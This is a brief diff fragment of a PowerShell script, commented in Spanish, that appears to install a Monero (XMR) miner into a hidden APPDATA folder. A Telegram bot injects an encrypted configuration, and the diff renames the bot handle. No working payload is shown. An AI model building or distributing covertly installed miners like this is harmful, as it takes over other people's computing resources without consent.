@@ -12,7 +12,7 @@ Write-Host ""
 
 # ── Configuracion (inyectada por el bot) ──────────────────
 $CONFIG = "MINER_CONFIG_PLACEHOLDER"   # El bot reemplaza esto con la config encriptada
-$BOT    = "@TuBotDeTelegram"
+$BOT    = "@Crypto Factory --XMR"
 
 # ── Directorio de instalacion ─────────────────────────────
 $INSTALL_DIR = "$env:APPDATA\.xmr_miner"
